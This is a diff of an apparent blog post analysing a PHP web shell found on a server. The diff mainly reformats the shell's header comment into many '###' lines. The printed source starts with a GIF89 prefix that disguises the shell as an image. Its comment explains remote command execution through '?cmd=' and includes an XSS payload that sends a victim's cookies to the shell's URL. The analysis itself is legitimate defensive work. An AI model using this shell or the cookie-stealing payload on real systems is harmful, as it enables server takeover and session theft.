@@ -16,42 +16,252 @@ This OPeNHaxshell v1.3 script looks similar to the [c99 shell][1], and has been 
 
 UPDATE: This is actually just a g00nshell v1.3. How disappointing.
 
+
 ### OPeNHaxshell v1.3 final Source Code
 
 {% highlight php %}GIF89;a
 666
 <?php
 /*
-#########################################################################################################
+
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
 #                       [OPeNHax]Tn presents:                         #
 #                       OPeNHaxshell v1.3 final                         #
-##########################################DOCUMENTATION###########################################
+
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###DOCUMENTATION
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+####
 #To execute commands, simply include ?cmd=___ in the url.            #
 #Ex: http://site.com/shl.php?cmd=whoami                              #
 #                                                                    #
 #To steal cookies, use ?cookie=___ in the url.                       #
 #Ex: &lt;script&gt;document.location.href=                                 #
 #'http://site.com/shl.php?cookie='+document.cookies&lt;/script&gt;         #
-#######################################VERIFICATION LEVELS#####################################
+
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###VERIFICATION LEVELS
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+####
 #0: No protection; anyone can access                                 #
 #1: User-Agent required                                              #
 #2: Require IP                                                       #
 #3: Basic Authentication                                             #
-#############################################KNOWN BUGS#############################################
+
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###KNOWN BUGS
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
 #Windows directory handling                                          #
 #                                                                    #
 #The SQL tool is NOT complete. There is currently no editing function#
 #available. Some time in the future this may be fixed, but for now   #
 #don't complain to me about it                                       #
-################################################SHOUTS################################################
+
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###SHOUTS
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
 #pr0be - Beta testing  & CSS                                         #
 #TrinTiTTY - Beta testing                                            #
 #clorox - Beta testing                                               #
 #Everyone else at g00ns.net                                          #
-####################################NOTE TO ADMINISTRATORS####################################
+
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###NOTE TO ADMINISTRATORS
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
 #If this script has been found on your server without your approval, #
 #it would probably be wise to delete it and check your logs.         #
-#########################################################################################################
+
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
 */
 // Configuration
 $auth = 0;
